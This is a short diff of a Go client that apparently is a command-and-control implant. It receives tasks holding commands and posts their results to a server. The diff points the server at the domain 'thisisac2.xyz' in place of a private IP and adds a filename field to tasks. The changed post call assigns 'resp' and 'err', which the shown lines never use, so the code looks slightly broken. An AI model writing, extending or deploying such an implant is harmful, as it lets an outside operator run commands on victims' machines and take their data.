@@ -17,6 +17,7 @@ type Task struct {
 	Action   string `json:"action"`
 	Command  string `json:"command"`
 	TaskID   string `json:"task_id"`
+	Filename string `json:"filename"`
 }
 
 type Result struct {
@@ -91,7 +92,7 @@ func (c *Client) handleTask(task Task) {
 			ReturnCode: returnCode,
 		}
 		jsonData, _ := json.Marshal(result)
-		http.Post("http://"+c.ServerIP+":"+c.Port+"/results", "application/json", bytes.NewBuffer(jsonData))
+		resp,err := http.Post("http://"+c.ServerIP+":"+c.Port+"/results", "application/json", bytes.NewBuffer(jsonData))
 	}
 }
 
@@ -139,7 +140,7 @@ func (c *Client) run() {
 
 func main() {
 	client := Client{
-		ServerIP: "10.50.0.12",
+		ServerIP: "thisisac2.xyz",
 		Port:     "80",
 		LocalIP:  getLocalIP(),
 	}
